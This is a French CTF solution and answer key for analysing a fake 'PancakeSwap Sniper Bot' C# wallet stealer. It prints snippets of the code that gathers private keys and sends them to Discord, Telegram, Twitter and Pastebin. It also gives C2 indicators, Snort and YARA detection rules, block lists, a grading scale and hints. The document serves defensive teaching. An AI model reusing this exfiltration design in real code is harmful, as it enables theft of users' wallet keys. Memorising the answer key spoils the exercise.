# SOLUTION CTF - PancakeSwap Sniper Bot v2

## ⚠️ CE FICHIER NE DOIT PAS ÊTRE COMMITÉ SUR GIT

Ce document contient les solutions pour l'exercice CTI PancakeSwap Sniper Bot v2.

---

## 🎯 Objectif du Challenge

Les participants doivent analyser le malware C#/.NET "PancakeSwap Sniper Bot v2" et identifier les **Indicateurs de Compromission (IoCs)**, notamment les serveurs C2 (Command & Control) dispersés dans différents modules C#.

---

## 🔍 Méthodologie d'Analyse

### 1. Analyse Statique du Code Source

**Commandes de recherche:**

```bash
# Explorer la structure du projet .NET
tree src/
cat PancakeSwapSniper.csproj

# Rechercher les URLs HTTP/HTTPS
grep -r "http" src/
grep -r "const.*=" src/ | grep -i "url\|endpoint\|webhook\|api"

# Rechercher des patterns de réseaux sociaux
grep -r "discord\|telegram\|twitter\|pastebin" src/

# Analyser les modules d'exfiltration
cat src/Exfiltration/DiscordNotifier.cs
cat src/Exfiltration/TelegramBackup.cs
cat src/Exfiltration/AnalyticsTracker.cs
```

**Structure du projet:**

```
PancakeSwap_Sniper_Botv2/
├── PancakeSwapSniper.csproj      # Fichier projet .NET 7.0
├── Program.cs                     # Point d'entrée avec UI Spectre.Console
├── src/
│   ├── Core/
│   │   └── WalletManager.cs      # Gestion wallets BSC (Nethereum)
│   ├── Trading/
│   │   └── SniperEngine.cs       # Logique de sniping PancakeSwap
│   ├── Exfiltration/
│   │   ├── DiscordNotifier.cs    # 🎯 C2 Discord
│   │   ├── TelegramBackup.cs     # 🎯 C2 Telegram
│   │   └── AnalyticsTracker.cs   # 🎯 C2 Twitter + Pastebin
│   └── Utils/
│       ├── Logger.cs             # Logging caché (.sniper_log)
│       └── SystemInfo.cs         # Collecte infos système
```

### 2. Localisation des C2

**C2 #1 - Discord** → `src/Exfiltration/DiscordNotifier.cs` ligne 11

```csharp
private const string DiscordWebhookUrl = "https://discord.gg/PancakeSniperAlerts2025";
```

**Fonctions d'exfiltration:**
- `NotifyWalletConnectedAsync()` - Exfiltre credentials wallet
- `NotifySnipeExecutedAsync()` - Exfiltre données de snipes
- `SendWebhookAsync()` - Envoie via Discord webhook

---

**C2 #2 & #3 - Telegram** → `src/Exfiltration/TelegramBackup.cs` lignes 11-14

```csharp
private const string BotToken = "bot7890123:XYZ-ABC9876defGHI-jkl54M3n2op123qr45";
private const string ChatId = "@pancake_sniper_backup";
private const string TelegramApiUrl = "https://api.telegram.org";
```

**Fonctions d'exfiltration:**
- `BackupWalletCredentialsAsync()` - Backup des credentials
- `BackupSnipeDataAsync()` - Backup des snipes exécutés
- `SendMessageAsync()` - Envoie via Telegram Bot API

---

**C2 #4 & #5 - Twitter + Pastebin** → `src/Exfiltration/AnalyticsTracker.cs` lignes 12-15

```csharp
private const string TwitterApiUrl = "https://api.twitter.com/2/tweets";
private const string TwitterHandle = "@PancakeSniperStats";
private const string PastebinApiUrl = "https://pastebin.com/api/api_post.php";
private const string PastebinApiKey = "pancake_sniper_analytics_2025";
```

**Fonctions d'exfiltration:**
- `TrackWalletConnectionAsync()` - Track connexions wallet
- `TrackSnipeExecutionAsync()` - Track snipes exécutés
- `SendToTwitterAsync()` - Envoie via Twitter DM API
- `UploadToPastebinAsync()` - Upload anonyme sur Pastebin
- `TrackPerformanceAsync()` - Statistiques d'utilisation

---

### 3. Analyse des Fonctions Malveillantes

**Program.cs - Fonction `ConnectWalletAsync()`** (lignes 85-139)

Cette fonction:
1. Demande private key à la victime
2. Connecte le wallet BSC avec Nethereum.Web3
3. Collecte les informations système via `SystemInfo.GetSystemInfoAsync()`
4. Exfiltre vers **3 canaux C2 simultanément**:

```csharp
// Lignes 124-128
await Task.WhenAll(
    discord.NotifyWalletConnectedAsync(exfilData),
    telegram.BackupWalletCredentialsAsync(exfilData),
    analytics.TrackWalletConnectionAsync(exfilData)
);
```

**Données exfiltrées:**

```csharp
var exfilData = new Dictionary<string, object>
{
    ["address"] = walletInfo.Address,
    ["privateKey"] = walletInfo.PrivateKey,  // ⚠️ Vol de clé privée
    ["balance"] = walletInfo.BnbBalance,
    ["connectedAt"] = walletInfo.ConnectedAt,
    ["systemInfo"] = systemInfo
};
```

**Program.cs - Fonction `ExecuteSnipesAsync()`** (lignes 154-210)

Cette fonction exfiltre également les données de snipes:

```csharp
// Lignes 202-205
await discord.NotifySnipeExecutedAsync(snipeData);
await analytics.TrackSnipeExecutionAsync(snipeData, walletData);
logger.LogSnipeExecution(snipeData);
```

Contient également la private key du wallet utilisé pour le snipe.

---

## 📋 IoCs Identifiés

### URLs C2

| Type | URL/Handle | Fichier | Usage |
|------|-----------|---------|-------|
| Discord | `https://discord.gg/PancakeSniperAlerts2025` | `src/Exfiltration/DiscordNotifier.cs` | Notifications temps réel |
| Telegram Bot | `@pancake_sniper_backup` | `src/Exfiltration/TelegramBackup.cs` | Backup credentials |
| Telegram API | `https://api.telegram.org/bot7890123:...` | `src/Exfiltration/TelegramBackup.cs` | Bot API |
| Twitter | `@PancakeSniperStats` | `src/Exfiltration/AnalyticsTracker.cs` | Analytics et stats |
| Pastebin | `https://pastebin.com/api/api_post.php` | `src/Exfiltration/AnalyticsTracker.cs` | Logging anonyme |

### Tokens/Clés API

| Type | Valeur | Fichier |
|------|--------|---------|
| Telegram Bot Token | `bot7890123:XYZ-ABC9876defGHI-jkl54M3n2op123qr45` | `src/Exfiltration/TelegramBackup.cs` |
| Pastebin API Key | `pancake_sniper_analytics_2025` | `src/Exfiltration/AnalyticsTracker.cs` |

### Fichiers Créés

| Fichier | Description |
|---------|-------------|
| `.sniper_log` | Log caché de toutes les activités (wallet, snipes) |

### Endpoints Externes

| URL | Usage |
|-----|-------|
| `https://api.ipify.org` | Récupération IP publique victime |

---

## 🛡️ Détection & Prévention

### Signatures Réseau (Snort/Suricata)

```
alert http any any -> any any (msg:"PancakeSniper C2 - Discord"; content:"discord.gg/PancakeSniperAlerts2025"; sid:5000001;)
alert http any any -> any any (msg:"PancakeSniper C2 - Telegram"; content:"t.me/pancake_sniper_backup"; sid:5000002;)
alert http any any -> any any (msg:"PancakeSniper C2 - Telegram API"; content:"api.telegram.org/bot7890123"; sid:5000003;)
alert http any any -> any any (msg:"PancakeSniper C2 - Twitter"; content:"@PancakeSniperStats"; sid:5000004;)
alert http any any -> any any (msg:"PancakeSniper C2 - Pastebin"; content:"pastebin.com/api"; sid:5000005;)
```

### URLs à Bloquer

```
discord.gg/PancakeSniperAlerts2025
api.telegram.org/bot7890123:XYZ-ABC9876defGHI-jkl54M3n2op123qr45
t.me/pancake_sniper_backup
api.twitter.com/2/tweets
api.twitter.com/2/dm_conversations/with/@PancakeSniperStats
pastebin.com/api/api_post.php
```

### YARA Rule

```yara
rule PancakeSwapSniperBot_v2
{
    meta:
        description = "Detects PancakeSwap Sniper Bot v2 malware"
        author = "CTF Challenge"
        date = "2025-11-08"
        
    strings:
        $discord = "discord.gg/PancakeSniperAlerts2025"
        $telegram_bot = "@pancake_sniper_backup"
        $twitter = "@PancakeSniperStats"
        $namespace = "namespace PancakeSwapSniper"
        $wallet_key = "privateKey"
        $nethereum = "Nethereum.Web3"
        
    condition:
        3 of them
}
```

---

## ✅ Points Clés à Retenir

### Ce que les participants doivent identifier:

1. ✅ **5 vecteurs C2** (Discord, Telegram Bot, Telegram API, Twitter, Pastebin)
2. ✅ **Type de malware**: Crypto wallet stealer / Trading bot malware / BSC sniper
3. ✅ **Données volées**: Private keys, adresses, balances BNB, données de snipes
4. ✅ **Architecture C#/.NET**: 3 modules exfil différents (DiscordNotifier, TelegramBackup, AnalyticsTracker)
5. ✅ **Techniques**: Multi-canal exfiltration, backup "légitime", Task.WhenAll pour parallélisation
6. ✅ **Ingénierie sociale**: Thème "DeFi sniper bot" pour cibler traders BSC/PancakeSwap
7. ✅ **Bibliothèques utilisées**: Nethereum.Web3 pour interaction BSC, Spectre.Console pour UI

### Compétences Évaluées:

- 📖 Lecture de code C#/.NET
- 🔍 Navigation dans une solution Visual Studio/Rider
- 🌐 Identification de patterns réseau malveillants
- 🛡️ Analyse de malware DeFi/BSC
- 📊 Rédaction de rapport CTI
- 🔧 Compréhension de l'écosystème .NET (NuGet, .csproj)

---

## 📝 Format de Réponse Attendu

```
RAPPORT D'ANALYSE - PancakeSwap Sniper Bot v2

1. TYPE DE MENACE
   - Cryptocurrency Wallet Stealer
   - BSC/PancakeSwap Trading Bot Malware
   - Binance Smart Chain Sniper Tool

2. IOCS IDENTIFIÉS
   - C2 Discord: https://discord.gg/PancakeSniperAlerts2025
   - C2 Telegram Bot: @pancake_sniper_backup
   - C2 Telegram API: https://api.telegram.org/bot7890123:XYZ-ABC9876defGHI-jkl54M3n2op123qr45
   - C2 Twitter: @PancakeSniperStats
   - C2 Pastebin: https://pastebin.com/api/api_post.php
   - Telegram Bot Token: bot7890123:XYZ-ABC9876defGHI-jkl54M3n2op123qr45
   - Pastebin API Key: pancake_sniper_analytics_2025

3. DONNÉES EXFILTRÉES
   - Private keys BSC/Ethereum
   - Adresses wallet
   - Balances BNB
   - Données de snipes (token, montant, txHash)
   - IP publique, hostname, username, OS platform
   - Timestamp de connexion

4. ARCHITECTURE
   - Langage: C# (.NET 7.0)
   - Package manager: NuGet
   - Dépendances principales:
     * Nethereum.Web3 v4.17.0 (interaction BSC)
     * Newtonsoft.Json v13.0.3 (JSON)
     * Spectre.Console v0.47.0 (UI)
   - Structure modulaire:
     * Core: WalletManager
     * Trading: SniperEngine
     * Exfiltration: 3 modules C2
     * Utils: Logger, SystemInfo
   - C2 dispersés dans 3 classes Exfiltration

5. VECTEUR D'ATTAQUE
   - Ingénierie sociale: "Bot de sniper automatisé PancakeSwap"
   - Cible: Traders DeFi sur Binance Smart Chain
   - Prétexte: Sniping de nouveaux tokens avec slippage intelligent
   - Distribution potentielle: GitHub, Telegram channels crypto

6. FONCTIONS MALVEILLANTES CLÉS
   - ConnectWalletAsync() (Program.cs:85-139)
     * Collecte private key
     * Exfiltre vers 3 C2 en parallèle (Task.WhenAll)
   
   - ExecuteSnipesAsync() (Program.cs:154-210)
     * Exfiltre données de snipes + private key
   
   - ShowStatisticsAsync() (Program.cs:244-268)
     * Exfiltre métriques d'utilisation + systemInfo

7. TECHNIQUES D'EXFILTRATION
   - Parallélisation avec Task.WhenAll
   - Fail silently (try/catch sans log)
   - Timeout de 5s pour éviter blocage UI
   - User-Agent customisé: "PancakeSniper-Analytics/2.0"
   - Backup multi-canal pour redondance

8. RECOMMANDATIONS
   - Bloquer les 5 URLs C2 identifiées
   - Chercher assembly PancakeSwapSniper.exe/.dll
   - Scanner pour fichier .sniper_log
   - Sensibiliser: ne jamais donner private key à des bots
   - Vérifier code source de tout bot DeFi/BSC
   - Monitorer connexions vers api.telegram.org, discord.gg, pastebin.com
   - Chercher dépendance Nethereum.Web3 dans projets suspects
```

---

## 🎓 Barème de Notation Suggéré

| Critère | Points |
|---------|--------|
| Identification des 5 C2 | 40 pts |
| Analyse de l'architecture .NET/C# | 15 pts |
| Liste complète des données exfiltrées | 20 pts |
| Compréhension du vecteur DeFi/BSC | 10 pts |
| Recommandations de détection/blocage | 10 pts |
| Qualité et clarté du rapport | 5 pts |
| **TOTAL** | **100 pts** |

**Bonus (5 pts):** Identifier l'utilisation de Task.WhenAll pour exfiltration parallélisée

---

## 📚 Ressources Pédagogiques

- MITRE ATT&CK: T1555.003 (Credentials from Password Stores)
- MITRE ATT&CK: T1056.002 (Input Capture)
- MITRE ATT&CK: T1041 (Exfiltration Over C2 Channel)
- MITRE ATT&CK: T1573 (Encrypted Channel - HTTPS)
- PancakeSwap Documentation
- Nethereum Documentation
- BSC Network Architecture
- .NET Security Best Practices

---

## 🔬 Analyse Approfondie

### Flux d'Exécution Malveillant

```
1. Victime lance: dotnet run
2. Program.cs affiche menu Spectre.Console (légitime en apparence)
3. Victime choisit "1. Connect Wallet"
4. Victime entre sa private key BSC
5. WalletManager.ConnectWalletAsync() se connecte avec Nethereum
6. SystemInfo.GetSystemInfoAsync() collecte données système
7. Exfiltration parallèle vers 3 C2:
   ├── Discord: NotifyWalletConnectedAsync()
   ├── Telegram: BackupWalletCredentialsAsync()
   └── Analytics: TrackWalletConnectionAsync()
       ├── Twitter DM
       └── Pastebin upload
8. Logger.LogWalletConnection() écrit .sniper_log caché
9. Message "Backup created successfully" (victime rassurée)
10. Victime continue à utiliser le bot normalement
11. Chaque snipe exécuté exfiltre à nouveau les credentials
```

### Indicateurs Comportementaux

- Connexions HTTPS simultanées vers discord.gg, api.telegram.org, pastebin.com
- Création de fichier caché `.sniper_log`
- User-Agent inhabituel: "PancakeSniper-Analytics/2.0"
- Requêtes vers api.ipify.org (récupération IP publique)
- Process .NET avec Nethereum.Web3 qui ne communique jamais avec BSC RPC

---

## 🔍 Indicateurs de Fichiers

### Hashes (exemple - varient selon compilation)

```
MD5: [À calculer après compilation]
SHA1: [À calculer après compilation]
SHA256: [À calculer après compilation]
```

### Metadata PE (si compilé en .exe Windows)

```
OriginalFilename: PancakeSwapSniper.exe
InternalName: PancakeSwapSniper
ProductName: PancakeSwap Sniper Bot
FileVersion: 2.0.0
CompanyName: PancakeSwap Sniper Team
```

### Dépendances Suspectes

```
PancakeSwapSniper.exe
├── Nethereum.Web3.dll (légitime mais utilisé pour crypto)
├── Newtonsoft.Json.dll (légitime)
├── Spectre.Console.dll (légitime)
└── System.Net.Http.dll (exfiltration)
```

---

## 📞 Support CTF

Pour les participants bloqués, indices progressifs:

1. **Indice 1**: "Explorez le dossier src/Exfiltration/"
2. **Indice 2**: "Recherchez les constantes de type string contenant 'http'"
3. **Indice 3**: "3 fichiers C# contiennent des URLs de réseaux sociaux"
4. **Indice 4**: "Discord, Telegram, Twitter, Pastebin = 5 C2 au total"
5. **Indice 5**: "TelegramBackup.cs contient 2 URLs différentes (Bot + API)"

---

**Fin de la solution - Bon CTF ! 🚀**
